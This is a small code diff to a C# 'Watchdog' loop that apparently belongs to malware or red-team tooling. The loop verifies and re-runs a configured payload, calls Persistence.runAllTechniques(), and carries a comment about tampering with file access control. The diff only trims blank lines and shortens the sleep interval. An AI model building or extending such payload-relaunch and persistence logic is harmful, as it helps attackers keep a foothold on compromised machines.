@@ -66,9 +66,6 @@ class Watchdog
 
             // mess with the access control on files and folders
             //implement way to deal with folder name changing
-           
-
-
 
             watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
             watchdogHelper.watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
@@ -79,7 +76,7 @@ class Watchdog
             Persistence.Persistence.runAllTechniques();
 
             Console.WriteLine("Watchdog is monitoring...");
-            Thread.Sleep(10000);  // Sleep for 1 second
+            Thread.Sleep(1000);  // Sleep for 1 second
         }
      }
 
